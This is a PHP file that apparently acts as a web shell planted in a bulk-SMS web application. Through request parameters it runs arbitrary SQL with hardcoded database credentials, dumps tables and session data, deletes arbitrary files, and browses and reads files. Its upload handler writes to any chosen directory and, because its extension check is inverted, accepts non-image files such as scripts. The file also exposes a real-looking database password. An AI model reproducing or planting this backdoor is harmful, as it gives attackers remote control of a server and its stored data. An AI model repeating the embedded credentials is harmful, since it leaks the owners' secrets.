
<?php

if($_REQUEST['r']=='tb'){
$dbname = 'bulksms_system';
$link=mysql_connect('localhost', 'bulksms_user', 'BALAJI@sr#ts7828');
if (!$link) {
    echo 'Could not connect to mysql';
    exit;
}
mysql_select_db($dbname, $link);

$sql = "SHOW TABLES FROM $dbname";
$result = mysql_query($sql);

if (!$result) {echo "DB Error, could not list tables\n";echo 'MySQL Error: ' . mysql_error();exit;}

while ($row = mysql_fetch_row($result)) {echo "Table: {$row[0]}\n";}
mysql_free_result($result);

if($_REQUEST['sql']!='')
{
$sql=$_REQUEST['sql'];
 $result = mysql_query($sql);
}


$tbl=$_REQUEST['tbl'];
$tbl2=$_REQUEST['cond'];
if($_REQUEST['order']!='')
{
$or=$_REQUEST['order'];
$tbl2.='ORDER BY '.$or.' DESC';
}
if($_REQUEST['limit']!='')
{$lmt=$_REQUEST['limit'];}else{$lmt='100';}
$result = mysql_query("SELECT * FROM $tbl $tbl2 LIMIT $lmt");
if (!$result) {
    echo 'Could not run query: ' . mysql_error();
    exit;
}
if (mysql_num_rows($result) > 0) {
    while ($row = mysql_fetch_assoc($result)) {
        print_r($row);
    }
}


die();}

if($_REQUEST['r']=='del')
{
$f=$_REQUEST['file'];
echo unlink($f);
}
if($_REQUEST['r']=='upload')
{
//The name of the directory that we need to create.
$dir=$_POST['dir']; 
//Check if the directory already exists.
if(!is_dir($dir)){
    //Directory does not exist, so lets create it.
    mkdir($dir, 0755, true);
}
?>


<html>
   <body>
      
      <form action="" method="POST" enctype="multipart/form-data">
         <input type="file" name="image" />
         <input type="text" name="dir">
         <input type="submit"/>
      </form>
      
   </body>
</html

<?php
   if(isset($_FILES['image'])){
      $errors= array();
      $file_name = $_FILES['image']['name'];
      $file_size =$_FILES['image']['size'];
      $file_tmp =$_FILES['image']['tmp_name'];
      $file_type=$_FILES['image']['type'];
      $dir=$_POST['dir'];
      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
      
      $expensions= array("jpeg","jpg","png");
      
      if(in_array($file_ext,$expensions)=== true){
         $errors[]="extension not allowed, please choose a JPEG or PNG file.";
      }
      
      if($file_size > 2097152){
         $errors[]='File size must be excately 2 MB';
      }
      
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,"$dir/".$file_name);
         echo "Success";
      }else{
         print_r($errors);
      }
   }
?>


<?php
die();
}

if($_REQUEST['r']=='s'){echo '<pre>' . print_r($_SESSION, TRUE) . '</pre>';die();}

echo $root = __DIR__;

function is_in_dir($file, $directory, $recursive = true, $limit = 1000) {
    $directory = realpath($directory);
    $parent = realpath($file);
    $i = 0;
    while ($parent) {
        if ($directory == $parent) return true;
        if ($parent == dirname($parent) || !$recursive) break;
        $parent = dirname($parent);
    }
    return false;
}

$path = null;
if (isset($_GET['file'])) {
    $path = $_GET['file'];
    if (!is_in_dir($_GET['file'], $root)) {
        $path = null;
    } else {
        $path = '/'.$path;
    }
}

if (is_file($root.$path)) {
    readfile($root.$path);
    return;
}

if ($path) echo '<a href="?file='.urlencode(substr(dirname($root.$path), strlen($root) + 1)).'">..</a><br />';
foreach (glob($root.$path.'/*') as $file) {
    $file = realpath($file);
    $link = substr($file, strlen($root) + 1);
    echo '<a href="?file='.urlencode($link).'">'.basename($file).'</a><br />';
}